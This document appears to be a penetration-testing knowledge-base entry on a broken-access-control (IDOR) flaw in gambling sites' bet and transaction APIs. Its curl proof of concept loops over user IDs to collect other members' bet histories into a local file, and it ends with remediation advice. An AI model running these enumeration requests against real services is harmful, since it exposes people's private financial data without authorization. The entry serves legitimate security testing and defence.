---
id: "bet-history-idor"
title: "Bulk unauthorized access to bet / transaction endpoints (site-wide member data)"
kind: "business-logic"
cve: null
related-cves: null
cve-note: "None (business logic)"
severity: "high"
cvss: 8.6
severity-basis: "cvss"
severity-note: null
product: "Custom bet and reporting endpoints (gambling)"
versions: "Any"
ports: "80, 443"
keywords: "bets, transactions, idor, broken access control, bulk, reports"
entry: "/api/bet/list?uid= /api/report/bet"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
GET /api/bet/list?uid=1001&page=1&size=20
GET /api/report/bet?startDate=..&endDate=..
GET /api/order/history?memberId=
```

## Prerequisites

- A regular member token; the endpoint accepts uid/memberId parameters.

## PoC

```bash
# 1) Your own bets (baseline)
curl -s 'https://target/api/bet/list?uid=<yourself>&page=1&size=20' -H "Authorization: Bearer <t>" | head -c 300

# 2) Change uid to iterate over other users
for u in 1001 1002 1003; do
 echo "== $u"
 curl -s "https://target/api/bet/list?uid=$u&page=1&size=20" -H "Authorization: Bearer <t>" | head -c 200
done
# Result: another user's bets are returned (including betAmount/win/lose) = confirmed

# 3) Bulk requests (rate-limit; do not crash the service)
for u in $(seq 1001 1100); do curl -s "https://target/api/bet/list?uid=$u&size=100" -H "Authorization: Bearer <t>" >> /tmp/bets.jsonl; done
wc -l /tmp/bets.jsonl
```

## Exploitation Steps

1. Perform step 2 first (single-user comparison) to confirm missing row-level authorization;
2. Then use a small batch (100 uid values) to demonstrate scale; do not retrieve the entire site;
3. The data can reveal member finances and agent structure — use this as evidence of impact;
4. Evidence: a bet response for another uid (mask phone/card numbers).

## Remediation and Mitigation

- Filter by the uid in the token and ignore the request's uid; agents may view only their own downlines.
- Add request-rate limits and auditing.

## References

- OWASP API Security Top 10 API1 BOLA.
